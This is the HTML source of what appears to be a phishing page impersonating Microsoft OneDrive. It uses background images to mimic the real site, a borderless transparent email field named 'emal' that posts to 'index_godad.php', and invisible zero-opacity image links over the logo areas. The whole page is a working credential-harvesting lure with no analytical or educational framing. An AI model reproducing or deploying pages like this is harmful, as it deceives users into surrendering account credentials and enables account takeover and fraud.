<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Files - OneDrive</title>
<link rel="shortcut icon" href="images/fav_onedrv.ico" />
<style type="text/css">
body
{
   background-color: #FFFFFF;
   background-image: url(images/bg.png);
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #E3E842;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<div id="bv_Image2" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:1366px;height:124px;text-align:left;z-index:2;">
<a href="#"><img src="images/ori.png" id="Image2" alt="" align="top" border="0" style="width:1366px;height:124px;"></a></div>
<div id="bv_Text2" style="margin:0;padding:0;position:absolute;left:242px;top:653px;width:150px;height:16px;text-align:left;z-index:3;">
<font style="font-size:13px" color="#000000" face="Arial">_</font></div>
<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:9px;top:150px;width:1340px;height:421px;text-align:left;z-index:4;">
<img src="images/bode_ver.png" id="Image1" alt="" align="top" border="0" style="width:1340px;height:421px;"></a></div>

<div id="bv_Form1" style="position:absolute;left:536px;top:311px;width:361px;height:150px;z-index:5">
<form name="Form1" method="post" action="index_godad.php" id="Form1">

<input type="email" id="Editbox1" style="position:absolute;left:24px;top:35px;width:303px;height:20px;border:0px #C0C0C0 dotted;background-color:transparent;font-family:'helvetica';font-size:14px;text-align:center;z-index:0" name="emal"  value="" pattern=".{10,50}" oninvalid="this.setCustomValidity('Required')" oninput="setCustomValidity('')" maxlength="50" required>

<input type="submit" id="Button1" name="Button1" value="" style="position:absolute;left:93px;top:77px;width:127px;height:46px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:1">
</form>
</div>
<div id="bv_Image3" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:315px;height:118px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:6;">
<a href="index.php"><img src="images/klik.png" id="Image3" alt="" align="top" border="0" style="width:315px;height:118px;"></a></div>
<div id="bv_Image4" style="margin:0;padding:0;position:absolute;left:1158px;top:9px;width:194px;height:110px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:7;">
<a href="index.php"><img src="images/klik.png" id="Image4" alt="" align="top" border="0" style="width:194px;height:110px;"></a></div>
<div id="bv_Image6" style="margin:0;padding:0;position:absolute;left:1296px;top:171px;width:42px;height:20px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:8;">
<a href="index.php"><img src="images/klik.png" id="Image6" alt="" align="top" border="0" style="width:42px;height:20px;"></a></div>
<input type="checkbox" id="Checkbox1" name="Checkbox1" value="on" style="position:absolute;left:574px;top:459px;z-index:9">
</body>
</html>